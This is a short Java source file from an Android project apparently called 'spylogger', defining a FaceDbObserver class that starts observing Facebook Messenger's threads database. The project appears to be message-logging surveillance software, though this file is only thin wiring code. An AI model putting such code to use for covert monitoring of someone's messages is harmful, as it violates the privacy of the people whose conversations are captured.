package com.gravatasufoca.spylogger.observers;

import android.content.Context;

import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookThreads;

/**
 * Created by bruno on 21/04/17.
 */

public class FaceDbObserver extends DbObserver{

    public FaceDbObserver(Context context) {
        super(context);
    }

    @Override
    public void observe() {
        start(getClass(), DatabaseHelperFacebookThreads.DATABASE_NAME);
    }
}
